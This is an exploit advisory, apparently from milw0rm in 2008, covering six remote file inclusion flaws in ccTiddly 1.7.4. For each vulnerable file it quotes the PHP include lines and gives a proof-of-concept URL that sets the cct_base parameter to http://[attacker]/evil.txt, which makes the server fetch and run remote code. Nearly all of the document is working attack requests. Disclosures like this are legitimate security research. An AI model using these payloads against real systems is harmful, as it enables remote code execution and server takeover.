<html><head><title>ccTiddly 1.7.4 (cct_base) Multiple Remote File Inclusion Vulnerabilities</title></head><pre>
/*

	$Id: cctiddly-1.7.4-rfi.txt,v 0.1 2008/12/04 04:12:20 cOndemned Exp $

	ccTiddly 1.7.4 (cct_base) Multiple Remote File Inclusion Vulnerabilities
	found by cOndemned
	
	download from : http://tiddlywiki.org/ccTiddly/ccTiddly_v1.7.4.zip
	
	Probably prior versions are vulnerable too...

	Greetz: ZaBeaTy, str0ke, TBH, Avantura

*/


0x01 :
	file : 
		/index.php
	poc : 
		http://[host]/[cctiddly_path]/index.php?cct_base=http://[attacker]/evil.txt?
	source :  

		18.	//includes
		19.	if(!isset($cct_base))
		20.		$cct_base = &quot;&quot;;
		21.
		22.	include_once($cct_base.&quot;includes/header.php&quot;);
		23.	include_once($cct_base.&quot;includes/login.php&quot;);	
	
0x02 :

	file :
		/handle/proxy.php
	poc :
		http://[host]/[cctiddly_path]/handle/proxy.php?cct_base=http://[attacker]/evil.txt?
	source :

		3.	if(!isset($cct_base)) 
		4.		$cct_base= &quot;../&quot;;
		5.	include_once($cct_base.&quot;includes/header.php&quot;);
		6.	include_once($cct_base.&quot;includes/config.php&quot;);

0x03 :

	file :
		/includes/header.php
	poc :
		http://[host]/[cctiddly_path]/handle/includes/header.php?cct_base=http://[attacker]/evil.txt?
	source :

		5.	if(!isset($cct_base)) 
		6.		$cct_base= &quot;&quot;;
		7.	include_once($cct_base.&quot;includes/functions.php&quot;);
		8.	include_once($cct_base.&quot;includes/config.php&quot;);
		9.	include_once($cct_base.&quot;includes/pluginLoader.php&quot;);
		10.	include_once($cct_base.&quot;lang/&quot;.$tiddlyCfg['pref']['language'].&quot;/language.php&quot;);
		11.	//include is used because language file is included once in config.php file
		12.	include_once($cct_base.&quot;includes/tiddler.php&quot;);
		13.	include_once($cct_base.&quot;includes/user.php&quot;);

0x04 :

	file :
		/includes/include.php
	poc :
		http://[host]/[cctiddly_path]/includes/include.php?cct_base=http://[attacker]/evil.txt?
	source :

		3.	include_once($cct_base.&quot;includes/ccAssignments.php&quot;);

0x05 :

	file :
		/includes/workspace.php	
	poc :
		http://[host]/[cctiddly_path]/includes/workspace.php?cct_base=http://[attacker]/evil.txt?
	source :
		3.	include_once($cct_base.&quot;includes/header.php&quot;);
		4.	include_once($cct_base.&quot;includes/user.php&quot;);
		5.	include_once($cct_base.&quot;includes/tiddler.php&quot;);

0x06 :

	file :
		/plugins/RSS/files/rss.php
	poc :
		http://[host]/[cctiddly_path]/plugins/RSS/files/rss.php?cct_base=http://[attacker]/evil.txt?
	source :

		3.	include_once($cct_base.&quot;includes/header.php&quot;);
		
EoF.

# milw0rm.com [2008-12-04]</pre></html>